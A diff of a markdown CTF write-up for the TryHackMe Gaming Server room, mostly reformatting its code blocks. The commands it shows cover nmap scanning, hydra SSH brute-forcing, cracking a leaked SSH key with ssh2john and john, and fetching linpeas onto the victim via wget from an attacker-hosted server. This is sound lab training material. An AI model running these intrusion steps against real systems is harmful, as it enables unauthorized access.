@@ -2,7 +2,7 @@
 permalink: /GamingWriteup.html
 ---
 
-![thumbnail](https://i.imgur.com/lZRim5g.jpg = 250x250)
+![thumbnail](https://i.imgur.com/lZRim5g.jpg = 100x100)
 
 ## Tryhackme Gaming Server Writeup.
 
@@ -15,9 +15,7 @@ This is how I got both flags.
 
 First, I started off with a simple nmap scan.
 
-```
-nmap -sC -sV -v -oA gamingserver *machine_ip*
-```
+```nmap -sC -sV -v -oA gamingserver *machine_ip*```
 
 This showed me that there were two ports open on the machine, port 22 for *SSH* and port 80 for *HTTP*
 
@@ -39,9 +37,7 @@ Since there was a webpage, I directed my attention there first.
 Simply checking the source of the websites index page showed a comment at the bottom referring to a user named *john*
 I ran hydra in the background to attempt to bruteforce his password, but nothing came up.
 
-```
-hydra -l john -P *path to wordlist* *machine_ip* ssh
-```
+```hydra -l john -P *path to wordlist* *machine_ip* ssh```
 
 Running gobuster using the common.txt wordlist from dirb revealed a /secret directory and an /uploads directory.
 The /secret directory seemed out of place, so I checked there first.
@@ -51,9 +47,7 @@ The /secret directory seemed out of place, so I checked there first.
 In the /secret index there was a single file named *"SecretKey"* and opening it revealed a private ssh key.
 I copied it to my folder and gave it the right permissions.
 
-```
-chmod 600 SecretKey
-```
+```chmod 600 SecretKey```
 
 Under the folder /uploads there were a few files and a wordlist which I assumed would be for bruteforcing something. So I saved it to my machine.
 
@@ -63,14 +57,11 @@ Simply ssh'ing into the machine under *John* prompted us with a password for the
 John the ripper should be good enough for this job!.
 First i used ssh2john to format the key into something john the ripper can read.
 
-```
-/usr/share/john/ssh2john.py SecretKey > keyhash
-```
+```/usr/share/john/ssh2john.py SecretKey > keyhash```
+
 Next, I ran the wordlist I found earlier in the uploads directory on the hash.
 
-```
-john keyhash -w=dict.lst
-```
+```john keyhash -w=dict.lst```
 
 Boom! Found it!
 
@@ -80,9 +71,7 @@ Boom! Found it!
 
 Now I have a way to access the machine, we can use ssh to log in as the *John* user.
 
-```
-ssh -i SecretKey john@machine_ip
-```
+```ssh -i SecretKey john@machine_ip```
 
 When prompted for a passphrase, we enter the one found by john the ripper earlier.
 
@@ -98,14 +87,11 @@ so finding it was more tedious than it should've.
 Let's run linpeas on the machine to find any privesc vectors.
 First, we create a python server in the folder where we have our [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script stored.
 
-```
-*ATTACKER MACHINE* sudo python3 -m http.server
-```
+```*ATTACKER MACHINE* sudo python3 -m http.server```
 
 Then we download the script on the victim machine
 
-```
-*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh
+```*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh
 ```
 From there it's as simple as running chmod and executing the script.
 
